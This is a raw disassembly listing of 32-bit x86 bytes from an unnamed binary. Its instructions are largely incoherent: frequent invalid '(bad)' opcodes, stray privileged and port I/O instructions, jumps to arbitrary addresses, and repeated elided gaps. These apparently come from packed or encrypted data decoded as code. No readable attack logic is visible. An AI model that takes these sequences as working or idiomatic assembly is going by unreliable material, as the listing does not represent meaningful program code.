  41a29b:	inc    edi
  41a29c:	push   ss
  41a29d:	test   DWORD PTR [ebx+ecx*1],edx
  41a2a0:	cs push esi
  41a2a2:	push   0x34f5a083
  41a2a7:	data16 add al,cl
  41a2aa:	call   0xf845bec2
  41a2af:	les    eax,FWORD PTR [eax+0x35]
  41a2b2:	mov    gs:0xd8340476,al
  41a2b8:	ja     0x41a246
  41a2ba:	loopne 0x41a2d5
  41a2bc:	ret    0x8a45
  41a2bf:	sub    ah,ch
  41a2c1:	inc    ecx
  41a2c2:	mov    esp,0x6e3a2604
  41a2c7:	(bad)  
  41a2c8:	cmp    al,0xf2
  41a2ca:	xchg   ebx,edi
  41a2cc:	pop    ebp
  41a2cd:	jns    0x41a2b5
  41a2cf:	into   
  41a2d0:	sub    eax,0xd3b669d
  41a2d5:	pop    edi
  41a2d6:	ins    DWORD PTR es:[edi],dx
  41a2d7:	inc    esi
  41a2d8:	and    ebx,esp
  41a2da:	mov    BYTE PTR [edi],cl
  41a2dc:	test   BYTE PTR [edi],0xce
  41a2df:	adc    al,0xad
  41a2e1:	mov    ebp,0xd9947aa6
  41a2e6:	cmp    eax,0x107bd55f
  41a2eb:	jns    0x41a2d3
  41a2ed:	push   esp
  41a2ee:	(bad)  
  41a2ef:	scas   al,BYTE PTR es:[edi]
  41a2f0:	cmp    esi,DWORD PTR [eax-0x5a33fabc]
  41a2f6:	jbe    0x41a28c
  41a2f8:	aad    0xe1
  41a2fa:	xlat   BYTE PTR ds:[ebx]
  41a2fb:	loopne 0x41a36c
  41a2fd:	dec    edx
  41a2fe:	inc    edi
  41a2ff:	ds clc 
  41a301:	sbb    edx,edi
  41a303:	xchg   ebp,eax
  41a304:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a305:	aad    0x49
  41a307:	jecxz  0x41a308
  41a309:	lock ja 0x41a368
  41a30c:	fiadd  DWORD PTR [esi]
  41a30e:	ja     0x41a36b
  41a310:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  41a371:	add    BYTE PTR [eax],al
  41a373:	add    bh,dh
  41a375:	pop    eax
  41a376:	test   al,0x13
  41a378:	scas   eax,DWORD PTR es:[edi]
  41a379:	repz (bad) 
  41a37b:	cld    
  41a37c:	adc    eax,0xf0a6955c
  41a381:	stos   BYTE PTR es:[edi],al
  41a382:	and    bh,cl
  41a384:	sub    edx,DWORD PTR [esi]
  41a386:	add    DWORD PTR [eax],eax
  41a388:	add    eax,0x56000001
  41a38d:	mov    edx,0x2bd152d8
  41a392:	outs   dx,DWORD PTR ds:[esi]
  41a393:	sbb    al,0xd8
  41a395:	mov    ch,ah
  41a397:	lock xchg ecx,eax
  41a399:	frndint 
  41a39b:	mov    ch,BYTE PTR [edx]
  41a39d:	test   BYTE PTR [ebx],al
  41a39f:	arpl   WORD PTR [edx+0x5b],sp
  41a3a2:	mov    ch,0x90
  41a3a4:	cs into 
  41a3a6:	adc    eax,0xfa757eec
  41a3ab:	bound  esi,QWORD PTR [ebp+0xb]
  41a3ae:	mov    bh,0xd3
  41a3b0:	add    DWORD PTR [edx+0x15f4ddfd],ebx
  41a3b6:	push   esp
  41a3b7:	lods   eax,DWORD PTR ds:[esi]
  41a3b8:	test   eax,0xed0ad130
  41a3bd:	ja     0x41a3b6
  41a3bf:	js     0x41a384
  41a3c1:	stc    
  41a3c2:	cmp    esp,DWORD PTR [esi]
  41a3c4:	mov    esi,0xda76b1f2
  41a3c9:	test   eax,0x25f9b298
  41a3ce:	and    ah,BYTE PTR ds:0x6a2e5ea3
  41a3d4:	pop    edi
  41a3d5:	add    DWORD PTR [eax],ecx
  41a3d7:	adc    esi,DWORD PTR [edx+esi*8-0x2b89625c]
  41a3de:	push   ds
  41a3df:	iret   
  41a3e0:	xchg   edi,eax
  41a3e1:	imul   edi,DWORD PTR [esi],0x45
  41a3e4:	stc    
  41a3e5:	dec    ebx
  41a3e6:	add    esp,ebx
  41a3e8:	pop    eax
  41a3e9:	retf   
  41a3ea:	test   al,0x25
  41a3ec:	lock adc ch,ch
  41a3ef:	fcomp  DWORD PTR [ecx+0x798000d9]
  41a3f5:	(bad)  
  41a3f6:	and    ebp,DWORD PTR [eax]
  41a3f8:	aad    0x45
  41a3fa:	aam    0xe3
  41a3fc:	xor    al,0xe7
  41a3fe:	mov    eax,0xd2ad7ed9
  41a403:	(bad)  
  41a404:	mov    eax,0x4b84785d
  41a409:	mov    ecx,0x1b2ff571
  41a40e:	je     0x41a41d
  41a410:	push   edx
  41a411:	test   BYTE PTR [ebp-0x18aaf365],ah
  41a417:	push   es
  41a418:	test   al,0x2b
  41a41a:	or     ebx,ecx
  41a41c:	dec    BYTE PTR [ebx]
  41a41e:	mov    eax,0xfc3b3a18
  41a423:	rcr    DWORD PTR [ecx+ebx*2-0x54f4840d],0x31
  41a42b:	sbb    dh,BYTE PTR [edi+ebx*8]
  41a42e:	mov    eax,ds:0xbe27eb08
  41a433:	call   0x8c45:0xfc291117
  41a43a:	inc    ebp
  41a43b:	xchg   ebx,eax
  41a43c:	ins    BYTE PTR es:[edi],dx
  41a43d:	and    edx,eax
  41a43f:	pop    ebp
  41a440:	(bad)
  41a443:	add    dl,ch
  41a445:	add    DWORD PTR [eax+0x1d3a7d16],eax
  41a44b:	ins    BYTE PTR es:[edi],dx
  41a44c:	popa   
  41a44d:	jns    0x41a460
  41a44f:	sub    DWORD PTR [ecx],ecx
  41a451:	jno    0x41a4c0
  41a453:	jge    0x41a45b
  41a455:	fbld   TBYTE PTR [edx+0x7f]
  41a458:	pop    edi
  41a459:	inc    ecx
  41a45a:	and    edx,DWORD PTR [ebp+0x330dcd47]
  41a460:	xchg   BYTE PTR [edi],dh
  41a462:	jg     0x41a4a8
  41a464:	imul   esp,DWORD PTR [edx],0xfffffffe
  41a467:	sbb    BYTE PTR [edx-0x53],ch
  41a46a:	stos   DWORD PTR es:[edi],eax
  41a46b:	(bad)  
  41a46c:	jmp    0xedd1b809
  41a471:	fsubr  st,st(2)
  41a473:	mov    ecx,0x7da92d33
  41a478:	stos   DWORD PTR es:[edi],eax
  41a479:	and    BYTE PTR [ebx-0x399feaa7],dh
  41a47f:	sub    eax,0x2cdc937b
  41a484:	mov    ?,WORD PTR [edi-0x4]
  41a487:	int    0xb0
  41a489:	xor    al,0xb3
  41a48b:	jge    0x41a4b3
  41a48d:	jns    0x41a421
  41a48f:	cmp    BYTE PTR [edi],dl
	...
  41a4f1:	add    BYTE PTR [eax],al
  41a4f3:	add    BYTE PTR [edi-0xf0307e],bh
  41a4f9:	dec    edi
  41a4fa:	push   DWORD PTR [edx+0x5f4d0d09]
  41a500:	push   ebp
  41a501:	sbb    al,bh
  41a503:	xor    dh,BYTE PTR [eax]
  41a505:	pop    ss
  41a506:	add    DWORD PTR [eax],eax
  41a508:	add    eax,0x69000001
  41a50d:	pop    esp
  41a50e:	jns    0x41a541
  41a510:	fisttp DWORD PTR [edx-0x48]
  41a513:	es and bh,al
  41a516:	imul   eax,DWORD PTR [eax+0x6e44d5d6],0x22ec9fe6
  41a520:	jmp    0xe78b:0x2f695a14
  41a527:	icebp  
  41a528:	in     eax,dx
  41a529:	imul   edx,DWORD PTR [ebp-0x2e216231],0xffffffbe
  41a530:	shr    BYTE PTR [edx+0x27],0xa2
  41a534:	out    0x44,eax
  41a536:	rol    DWORD PTR [ebx+eax*1-0x65],cl
  41a53a:	in     eax,dx
  41a53b:	icebp  
  41a53c:	xlat   BYTE PTR ds:[ebx]
  41a53d:	xlat   BYTE PTR ds:[ebx]
  41a53e:	xlat   BYTE PTR ds:[ebx]
  41a53f:	pushf  
  41a540:	ins    BYTE PTR es:[edi],dx
  41a541:	ret    
  41a542:	add    al,0xda
  41a544:	adc    esp,DWORD PTR gs:[edi]
  41a547:	cmc    
  41a548:	out    dx,eax
  41a549:	fsubr  QWORD PTR [ecx+0x259949ee]
  41a54f:	inc    eax
  41a550:	in     eax,0x50
  41a552:	in     al,0x64
  41a554:	pop    esi
  41a555:	nop
  41a556:	sub    eax,0x2cfc6198
  41a55b:	(bad)  
  41a55c:	push   ss
  41a55d:	and    ebx,edx
  41a55f:	fidivr WORD PTR [ebp+edi*4+0x1b811bdf]
  41a566:	cdq    
  41a567:	push   cs
  41a568:	mov    eax,0xc1b545c7
  41a56d:	scas   eax,DWORD PTR es:[edi]
  41a56e:	rcr    BYTE PTR [eax+0x686002ce],cl
  41a574:	sub    DWORD PTR [esp+edx*8-0x5],ebx
  41a578:	sbb    al,0x7
  41a57a:	pushf  
  41a57b:	pop    ds
  41a57c:	fdivr  st(5),st
  41a57e:	adc    al,0xfa
  41a580:	fiadd  DWORD PTR [ebx+0x6bde430]
  41a586:	scas   eax,DWORD PTR es:[edi]
  41a587:	push   edx
  41a588:	xor    DWORD PTR ds:0x5cd0ff0d,0x19
  41a58f:	out    0xd9,eax
  41a591:	aad    0xc
  41a593:	xchg   esp,eax
  41a594:	fild   WORD PTR [edi+0x77c855e8]
  41a59a:	(bad)  [eax]
  41a59c:	mov    ecx,0x7ad89c70
  41a5a1:	pop    ecx
  41a5a2:	mov    bl,0xb9
  41a5a4:	xchg   ebp,eax
  41a5a5:	mov    ds:0x10444655,al
  41a5aa:	jmp    0xfeeb:0x88347065
  41a5b1:	(bad)  
  41a5b2:	imul   ecx,DWORD PTR [edx+ebx*8],0x49178042
  41a5b9:	scas   eax,DWORD PTR es:[edi]
  41a5ba:	stos   DWORD PTR es:[edi],eax
  41a5bb:	xor    DWORD PTR [ebx-0x2d1999fc],esi
  41a5c1:	aas    
  41a5c2:	rol    ebp,cl
  41a5c4:	push   0x33
  41a5c6:	iret   
  41a5c7:	test   al,0x5
  41a5c9:	test   eax,0xb0756d43
  41a5ce:	pop    esi
  41a5cf:	and    al,0xbf
  41a5d1:	call   0x7518:0x18dd1ca8
  41a5d8:	xchg   edx,eax
  41a5d9:	mov    ds:0x6dd399d,eax
  41a5de:	mov    esp,0xf541e1fd
  41a5e3:	and    eax,0x8800d54b
  41a5e8:	jb     0x41a648
  41a5ea:	pop    ecx
  41a5eb:	xor    dl,bh
  41a5ed:	mov    ds:0x2c7fd723,al
  41a5f2:	dec    edx
  41a5f3:	hlt    
  41a5f4:	scas   al,BYTE PTR es:[edi]
  41a5f5:	add    eax,0xe2ba7d20
  41a5fa:	ja     0x41a594
  41a5fc:	push   edx
  41a5fd:	jmp    0x41a656
  41a5ff:	loopne 0x41a656
  41a601:	stos   BYTE PTR es:[edi],al
  41a602:	out    dx,eax
  41a603:	int    0xfd
  41a605:	mov    ecx,0x16f51102
  41a60a:	xor    edx,esp
  41a60c:	jnp    0x41a689
  41a60e:	pop    esp
  41a60f:	push   0x22
	...
  41a671:	add    BYTE PTR [eax],al
  41a673:	add    BYTE PTR [edx+ebp*1+0x1],bl
  41a677:	inc    ecx
  41a678:	ja     0x41a6e5
  41a67a:	pop    esp
  41a67b:	aas    
  41a67c:	dec    ecx
  41a67d:	push   0x5548a625
  41a682:	das    
  41a683:	xor    DWORD PTR ds:0x5000118,0x1
  41a68a:	add    BYTE PTR [eax],al
  41a68c:	mov    dl,0x3d
  41a68e:	addr16 test al,0x9
  41a691:	push   edx
  41a692:	and    DWORD PTR [ecx+0x3be6fa2b],ebx
  41a698:	push   eax
  41a699:	or     DWORD PTR [ecx],ecx
  41a69b:	aaa    
  41a69c:	icebp  
  41a69d:	pusha  
  41a69e:	hlt    
  41a69f:	gs cld 
  41a6a1:	mov    edx,0x2821abdf
  41a6a6:	test   eax,0xb3e75381
  41a6ab:	fnstcw WORD PTR [ecx]
  41a6ad:	fmul   st(4),st
  41a6af:	sub    eax,0x476e82e4
  41a6b4:	adc    ecx,DWORD PTR [esp+eax*1-0xb3ed761]
  41a6bb:	dec    edx
  41a6bc:	in     eax,dx
  41a6bd:	push   0xb2b9114d
  41a6c2:	mov    ch,0xb7
  41a6c4:	push   0x2764c9cd
  41a6c9:	dec    esp
  41a6ca:	cdq    
  41a6cb:	pop    ebx
  41a6cc:	sar    DWORD PTR [eax],cl
  41a6ce:	xchg   edi,eax
  41a6cf:	or     DWORD PTR [edx],esp
  41a6d1:	not    dh
  41a6d3:	cli    
  41a6d4:	js     0x41a658
  41a6d6:	jo     0x41a6bf
  41a6d8:	outs   dx,BYTE PTR ds:[esi]
  41a6d9:	adc    bh,BYTE PTR [ebx]
  41a6db:	inc    edi
  41a6dc:	(bad)  
  41a6dd:	adc    edx,ebx
  41a6df:	mov    WORD PTR [esi+0x5826c589],?
  41a6e5:	pop    ds
  41a6e6:	mov    ebx,ecx
  41a6e8:	stc    
  41a6e9:	out    dx,al
  41a6ea:	cld    
  41a6eb:	inc    eax
  41a6ec:	les    edx,FWORD PTR [ebp-0x1b]
  41a6ef:	das    
  41a6f0:	or     al,0xaf
  41a6f2:	add    eax,0x1644fe9b
  41a6f7:	addr16 xchg ebx,eax
  41a6f9:	sar    DWORD PTR [ebx+0x5b],1
  41a6fc:	sar    esp,cl
  41a6fe:	pop    ecx
  41a6ff:	fist   DWORD PTR [edi-0x41e30694]
  41a705:	push   ss
  41a706:	xchg   edx,eax
  41a707:	dec    edi
  41a708:	loopne 0x41a6ec
  41a70a:	lods   eax,DWORD PTR ds:[esi]
  41a70b:	(bad)  
  41a70c:	popa   
  41a70d:	shr    edx,cl
  41a70f:	sub    DWORD PTR [ecx+ecx*2-0x6b3d6fe8],0x7e0f87b9
  41a71a:	es not bh
  41a71d:	test   dl,bl
  41a71f:	pop    esi
  41a720:	retf   
  41a721:	mov    edx,0x4296e96b
  41a726:	push   cs
  41a727:	dec    ecx
  41a728:	cmp    al,0x22
  41a72a:	jp     0x41a751
  41a72c:	dec    eax
  41a72d:	loop   0x41a6b8
  41a72f:	sub    bh,BYTE PTR [ecx+0x4dde62c7]
  41a735:	sub    al,al
  41a737:	loop   0x41a6c0
  41a739:	sub    ecx,DWORD PTR [edi+0x196a0457]
  41a73f:	add    dl,0x4c
  41a742:	repnz xchg esp,eax
  41a744:	in     al,0x92
  41a746:	inc    ecx
  41a747:	lods   eax,DWORD PTR ds:[esi]
  41a748:	clc    
  41a749:	push   edx
  41a74a:	in     al,0x16
  41a74c:	xchg   ebp,eax
  41a74d:	xor    al,0x4e
  41a74f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a750:	aas    
  41a751:	lods   al,BYTE PTR fs:[esi]
  41a753:	call   0xcdcc7e2b
  41a758:	jno    0x41a6e7
  41a75a:	mov    ch,ch
  41a75c:	push   edx
  41a75d:	enter  0xd9c0,0xf5
  41a761:	push   edi
  41a762:	cs and al,0x6e
  41a765:	sub    al,0xe9
  41a767:	adc    BYTE PTR [ebx],dh
  41a769:	push   0x7363ddb8
  41a76e:	lds    eax,FWORD PTR [eax+0x66]
  41a771:	ret    
  41a772:	aaa    
  41a773:	dec    edi
  41a774:	lds    edx,FWORD PTR [ebp-0x2c1cbfda]
  41a77a:	xor    DWORD PTR [ecx+0x7b804b1a],0x6f
  41a781:	mov    ds:0x2fd61b72,eax
  41a786:	push   edi
  41a787:	out    dx,al
  41a788:	cs push esi
  41a78a:	(bad)  
  41a78b:	push   eax
  41a78c:	dec    ecx
  41a78d:	ins    BYTE PTR es:[edi],dx
  41a78e:	jecxz  0x41a730
  41a790:	cmp    al,BYTE PTR [eax]
	...
  41a7f2:	add    BYTE PTR [eax],al
  41a7f4:	repz xchg edi,eax
  41a7f6:	jae    0x41a77f
  41a7f8:	ja     0x41a7e1
  41a7fa:	div    edi
  41a7fc:	mov    ds:0x865327ca,al
  41a801:	nop
  41a802:	stos   DWORD PTR es:[edi],eax
  41a803:	mov    al,0x3a
  41a805:	sbb    DWORD PTR [ecx],eax
  41a807:	add    BYTE PTR ds:0xae000001,al
  41a80d:	int3   
  41a80e:	xor    ch,BYTE PTR [edx+0x4b]
  41a811:	adc    BYTE PTR [esi],dh
  41a813:	scas   al,BYTE PTR es:[edi]
  41a814:	pop    DWORD PTR [ebx+0x43]
  41a817:	sar    BYTE PTR [esi],cl
  41a819:	add    edi,edi
  41a81b:	mov    edi,0x2541bfcc
  41a820:	pop    ebx
  41a821:	jnp    0x41a7a4
  41a823:	mov    bl,0x52
  41a825:	dec    eax
  41a826:	sub    ah,BYTE PTR [esi+eax*2+0x619ef535]
  41a82d:	mov    ecx,0x33243b34
  41a832:	pop    ebp
  41a833:	lahf   
  41a834:	add    al,0x43
  41a836:	(bad)  
  41a837:	rol    DWORD PTR [ecx+0x53],cl
  41a83a:	jmp    0x41a80b
  41a83c:	lods   eax,DWORD PTR ds:[esi]
  41a83d:	sbb    BYTE PTR [edi+0x56],0x42
  41a841:	out    0xfd,eax
  41a843:	fsubr  st,st(1)
  41a845:	icebp  
  41a846:	adc    DWORD PTR [ebp+0x35],0xffffffa6
  41a84a:	in     al,dx
  41a84b:	cmp    al,0x97
  41a84d:	xchg   DWORD PTR [edi+0x1a753123],edx
  41a853:	clc    
  41a854:	ret    0x989a
  41a857:	sub    DWORD PTR [edi+ecx*4+0xc],ebx
  41a85b:	xchg   esp,eax
  41a85c:	jbe    0x41a898
  41a85e:	and    al,0xc
  41a860:	sub    ecx,DWORD PTR [edi+0x65]
  41a863:	(bad)  
  41a864:	loope  0x41a84f
  41a866:	mov    edx,0x7e0f1c67
  41a86b:	cli    
  41a86c:	out    dx,eax
  41a86d:	lods   al,BYTE PTR ds:[esi]
  41a86e:	imul   edx,DWORD PTR [edi+0x73],0xffffffd1
  41a872:	inc    esi
  41a873:	js     0x41a88a
  41a875:	jmp    0xb04d087e
  41a87a:	fdivr  DWORD PTR [esi]
  41a87c:	sbb    eax,0xf2332044
  41a881:	ins    BYTE PTR es:[edi],dx
  41a882:	popa   
  41a883:	and    eax,0x2b485d3d
  41a888:	xchg   edx,eax
  41a889:	add    BYTE PTR [esp+edx*1-0x32],dh
  41a88d:	cdq    
  41a88e:	push   0x4065f252
  41a893:	jmp    0x3576e8a5
  41a898:	pop    ds
  41a899:	inc    eax
  41a89a:	pop    eax
  41a89b:	popa   
  41a89c:	and    ah,BYTE PTR [ebx+0x6923d0c1]
  41a8a2:	cmc    
  41a8a3:	adc    DWORD PTR [edi+ecx*8-0x394393ff],esi
  41a8aa:	sub    al,ah
  41a8ac:	into   
  41a8ad:	pop    edx
  41a8ae:	mov    bl,BYTE PTR [ebx]
  41a8b0:	outs   dx,DWORD PTR ds:[esi]
  41a8b1:	lods   eax,DWORD PTR ds:[esi]
  41a8b2:	mov    ch,0x24
  41a8b4:	js     0x41a863
  41a8b6:	and    al,0x3a
  41a8b8:	push   ebp
  41a8b9:	(bad)  
  41a8ba:	jecxz  0x41a8ea
  41a8bc:	pop    edi
  41a8bd:	in     al,0x5
  41a8bf:	dec    eax
  41a8c0:	sbb    BYTE PTR [edx+0x1e],bh
  41a8c3:	(bad)  
  41a8c4:	jno    0x41a8fe
  41a8c6:	sub    dl,cl
  41a8c8:	test   eax,0xcd12ee1a
  41a8cd:	jmp    0x41a875
  41a8cf:	gs adc al,0xe3
  41a8d2:	(bad)  
  41a8d3:	std    
  41a8d4:	mov    esp,0x5ec49778
  41a8d9:	shl    BYTE PTR [ecx-0x24],cl
  41a8dc:	push   0xd4ac99ae
  41a8e1:	inc    ecx
  41a8e2:	xor    BYTE PTR [esi+0x455e76be],cl
  41a8e8:	xchg   esi,eax
  41a8e9:	div    DWORD PTR [ebx]
  41a8eb:	stos   BYTE PTR es:[edi],al
  41a8ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a8ed:	leave  
  41a8ee:	pop    esi
  41a8ef:	push   ss
  41a8f0:	out    0xa4,al
  41a8f2:	fisubr WORD PTR [esi]
  41a8f4:	xchg   esp,eax
  41a8f5:	mov    edx,0x6951e2aa
  41a8fa:	je     0x41a8c4
  41a8fc:	out    dx,eax
  41a8fd:	jb     0x41a904
  41a8ff:	sti    
  41a900:	jge    0x41a938
  41a902:	inc    eax
  41a903:	(bad)  
  41a904:	jg     0x41a930
  41a906:	popf   
  41a907:	cmp    ebx,DWORD PTR [eax]
  41a909:	push   cs
  41a90a:	fbld   TBYTE PTR [ecx]
  41a90c:	adc    al,0xc3
  41a90e:	ret    
  41a90f:	cmova  eax,DWORD PTR [eax]
	...
  41a972:	add    BYTE PTR [eax],al
  41a974:	xor    eax,0xcf4a867e
  41a979:	cli    
  41a97a:	std    
  41a97b:	jg     0x41a9cb
  41a97d:	push   edx
  41a97e:	pushf  
  41a97f:	dec    esp
  41a980:	pusha  
  41a981:	sub    ebp,edi
  41a983:	cld    
  41a984:	aas    
  41a985:	sbb    al,BYTE PTR [ecx]
  41a987:	add    BYTE PTR ds:0x55000001,al
  41a98d:	push   0x41
  41a98f:	mov    ds:0xcd5758d0,eax
  41a994:	dec    ebx
  41a995:	jl     0x41a9b7
  41a997:	ja     0x41a9cd
  41a999:	fcmove st,st(4)
  41a99b:	rol    DWORD PTR [ebx-0x58aadb2e],cl
  41a9a1:	shl    cl,cl
  41a9a3:	sahf   
  41a9a4:	ret    
  41a9a5:	imul   ebp,DWORD PTR [esi-0x79a5705a],0x4d
  41a9ac:	jno    0x41aa13
  41a9ae:	or     esp,DWORD PTR [edx+0x78]
  41a9b1:	sub    DWORD PTR [esi+0x1e],eax
  41a9b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9b5:	jb     0x41aa06
  41a9b7:	idiv   BYTE PTR [eax-0x70632c56]
  41a9bd:	pop    edi
  41a9be:	dec    ecx
  41a9bf:	loope  0x41a9f1
  41a9c1:	or     eax,0xd1b53069
  41a9c6:	xchg   esp,eax
  41a9c7:	inc    esi
  41a9c8:	push   eax
  41a9c9:	push   eax
  41a9ca:	ins    BYTE PTR es:[edi],dx
  41a9cb:	cld    
  41a9cc:	cli    
  41a9cd:	mov    al,0xab
  41a9cf:	shl    BYTE PTR [eax],cl
  41a9d1:	ins    BYTE PTR es:[edi],dx
  41a9d2:	mov    edi,0xf849ccc4
  41a9d7:	xchg   ebp,eax
  41a9d8:	push   esi
  41a9d9:	adc    DWORD PTR [esi-0x65],ebp
  41a9dc:	call   0x9940929
  41a9e1:	push   edi
  41a9e2:	sub    BYTE PTR [eax-0x141dfaac],dh
  41a9e8:	mov    bh,0xf5
  41a9ea:	adc    eax,0xa4f29425
  41a9ef:	out    dx,al
  41a9f0:	repz xor eax,0xd0bb8987
  41a9f6:	inc    esp
  41a9f7:	aad    0x77
  41a9f9:	dec    ebp
  41a9fa:	dec    esp
  41a9fb:	dec    edi
  41a9fc:	(bad)  
  41a9fd:	repz inc ebx
  41a9ff:	adc    BYTE PTR [edx+ebp*8],0x80
  41aa03:	dec    esp
  41aa04:	push   0xffffff96
  41aa06:	pusha  
  41aa07:	mov    WORD PTR [ecx],?
  41aa09:	jmp    FWORD PTR [ebp+0x18]
  41aa0c:	das    
  41aa0d:	test   al,0x83
  41aa0f:	mov    bl,0x8f
  41aa11:	adc    ecx,DWORD PTR ds:0x808d5c88
  41aa17:	push   esp
  41aa18:	std    
  41aa19:	sub    eax,0xacf2e1d9
  41aa1e:	and    al,0xac
  41aa20:	in     al,0x7d
  41aa22:	push   ss
  41aa23:	jmp    0x168b759f
  41aa28:	add    BYTE PTR [edx-0x36],bl
  41aa2b:	pop    esi
  41aa2c:	lods   eax,DWORD PTR ds:[esi]
  41aa2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa2e:	cdq    
  41aa2f:	leave  
  41aa30:	fs cli 
  41aa32:	jnp    0x41aa6e
  41aa34:	fcomp  QWORD PTR [edi-0x2623955a]
  41aa3a:	cmc    
  41aa3b:	pop    esi
  41aa3c:	scas   eax,DWORD PTR es:[edi]
  41aa3d:	popf   
  41aa3e:	sub    ch,ah
  41aa40:	icebp  
  41aa41:	stos   BYTE PTR es:[edi],al
  41aa42:	mov    dl,ah
  41aa44:	push   ss
  41aa45:	test   eax,0x1511cf40
  41aa4a:	out    0x2c,al
  41aa4c:	push   esi
  41aa4d:	adc    BYTE PTR [edi+0x1ab627e2],bh
  41aa53:	mov    ?,WORD PTR [ecx-0x14]
  41aa56:	push   esp
  41aa57:	(bad)  
  41aa58:	fidiv  DWORD PTR [ecx]
  41aa5a:	mov    dh,0xc7
  41aa5c:	push   0x3e
  41aa5e:	pop    edi
  41aa5f:	stc    
  41aa60:	jo     0x41aa07
  41aa62:	sub    al,0xa6
  41aa64:	ror    DWORD PTR [ebx+0x47],1
  41aa67:	es rol dl,cl
  41aa6a:	sub    eax,0x74b8c973
  41aa6f:	inc    ebx
  41aa70:	mul    ecx
  41aa72:	add    al,0x77
  41aa74:	test   eax,0x197ba35
  41aa79:	ss call 0x849e29cf
  41aa7f:	loopne 0x41aa85
  41aa81:	inc    edi
  41aa82:	push   eax
  41aa83:	cmp    dh,BYTE PTR [ecx+0x657cb892]
  41aa89:	and    eax,DWORD PTR [ebx+0x703cec44]
  41aa8f:	push   ss
  41aa90:	inc    ebp
	...
  41aaf1:	add    BYTE PTR [eax],al
  41aaf3:	add    bh,dh
  41aaf5:	add    esp,ebx
  41aaf7:	mov    ah,0xfe
  41aaf9:	std    
  41aafa:	inc    DWORD PTR [ebx+0x5f]
  41aafd:	sbb    BYTE PTR [esi+0x43],ah
  41ab00:	das    
  41ab01:	jl     0x41ab57
  41ab03:	ins    BYTE PTR es:[edi],dx
  41ab04:	inc    esp
  41ab05:	sbb    eax,DWORD PTR [ecx]
  41ab07:	add    BYTE PTR ds:0x64000001,al
  41ab0d:	mov    ah,0x35
  41ab0f:	xchg   ecx,eax
  41ab10:	sar    BYTE PTR [edi-0x49775f61],0xc1
  41ab17:	cmp    al,0x8d
  41ab19:	mov    eax,ds:0xf7502b25
  41ab1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab1f:	icebp  
  41ab20:	sbb    eax,0x43668668
  41ab25:	add    esi,DWORD PTR [ecx+0x5752f692]
  41ab2b:	mov    ecx,0x67b5f0f1
  41ab30:	cmp    DWORD PTR [esp+ecx*8+0x472e3e00],edx
  41ab37:	stc    
  41ab38:	bound  ebx,QWORD PTR [ecx+0x7a]
  41ab3b:	and    BYTE PTR [edi],bh
  41ab3d:	es push ebp
  41ab3f:	add    bl,BYTE PTR [ebx-0x29]
  41ab42:	jae    0x41ab65
  41ab44:	fldenv [eax+esi*2-0x1074ec53]
  41ab4b:	test   eax,0x957cd306
  41ab50:	and    BYTE PTR [edx-0x5f42fa73],bh
  41ab56:	xor    DWORD PTR [ebx+edx*1+0x7f0d8407],ebx
  41ab5d:	dec    ecx
  41ab5e:	inc    edi
  41ab5f:	mov    ds:0x6d3945dc,al
  41ab64:	cmp    bh,BYTE PTR [ebx+0x12372642]
  41ab6a:	add    eax,0xc60baf28
  41ab6f:	stos   DWORD PTR es:[edi],eax
  41ab70:	(bad)  
  41ab71:	mov    ds:0x8c020058,eax
  41ab76:	ja     0x41abcd
  41ab78:	mov    esi,0x6b39ae65
  41ab7d:	push   esi
  41ab7e:	arpl   WORD PTR [ebx+0x22c00518],cx
  41ab84:	push   es
  41ab85:	push   ecx
  41ab86:	inc    ecx
  41ab87:	(bad)  
  41ab88:	and    eax,0x63c7acd5
  41ab8d:	stos   BYTE PTR es:[edi],al
  41ab8e:	push   ebp
  41ab8f:	stos   BYTE PTR es:[edi],al
  41ab90:	xlat   BYTE PTR ds:[ebx]
  41ab91:	adc    al,0xde
  41ab93:	mov    edx,0xda137614
  41ab98:	mov    dh,0x9d
  41ab9a:	das    
  41ab9b:	push   eax
  41ab9c:	sub    BYTE PTR ds:0x65fb4eee,0x7a
  41aba3:	loopne 0x41abf2
  41aba5:	scas   eax,DWORD PTR es:[edi]
  41aba6:	mov    ss,WORD PTR [edx-0x43]
  41aba9:	shl    DWORD PTR ds:0x7cdc5aec,0x9d
  41abb0:	es cmp BYTE PTR cs:[eax],dl
  41abb4:	xor    dh,dl
  41abb6:	mov    bl,0xbf
  41abb8:	fidiv  WORD PTR [ecx-0x70f396d3]
  41abbe:	mov    eax,0x301bb4fd
  41abc3:	xchg   edx,eax
  41abc4:	xor    esp,DWORD PTR [eax]
  41abc6:	push   ebx
  41abc7:	sbb    al,0x2
  41abc9:	rcl    DWORD PTR [edx-0x150b9e06],0x7e
  41abd0:	into   
  41abd1:	add    al,0xad
  41abd3:	les    edx,FWORD PTR [ebp-0x4c]
  41abd6:	mov    bh,0xab
  41abd8:	push   esp
  41abd9:	fs popa 
  41abdb:	inc    ebp
  41abdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41abdd:	adc    ah,bh
  41abdf:	lahf   
  41abe0:	ins    BYTE PTR es:[edi],dx
  41abe1:	push   edx
  41abe2:	or     DWORD PTR [ecx],ebx
  41abe4:	adc    al,0xaa
  41abe6:	dec    ebx
  41abe7:	fiadd  WORD PTR [ebx+0x346a4358]
  41abed:	push   esi
  41abee:	add    ecx,edi
  41abf0:	loope  0x41ac48
  41abf2:	bound  edx,QWORD PTR [ebp-0x3e]
  41abf5:	test   al,0x7b
  41abf7:	rcl    DWORD PTR [esi-0x30],cl
  41abfa:	dec    esi
  41abfb:	test   DWORD PTR [edi],esi
  41abfd:	sar    DWORD PTR [edx],cl
  41abff:	sbb    BYTE PTR [eax+0x241f64be],ah
  41ac05:	adc    al,0x4c
  41ac07:	imul   edx,DWORD PTR [edx-0x4c],0xffffffb0
  41ac0b:	cmp    eax,0xe88ed0fb
  41ac10:	sbb    eax,0x0
	...
  41ac71:	add    BYTE PTR [eax],al
  41ac73:	add    BYTE PTR [edx+0x49],ch
  41ac76:	es cmp al,0x27
  41ac79:	jg     0x41acf5
  41ac7b:	pop    edi
  41ac7c:	or     al,0x44
  41ac7e:	xor    ah,BYTE PTR [esi+eax*2-0x60]
  41ac82:	loop   0x41aca8
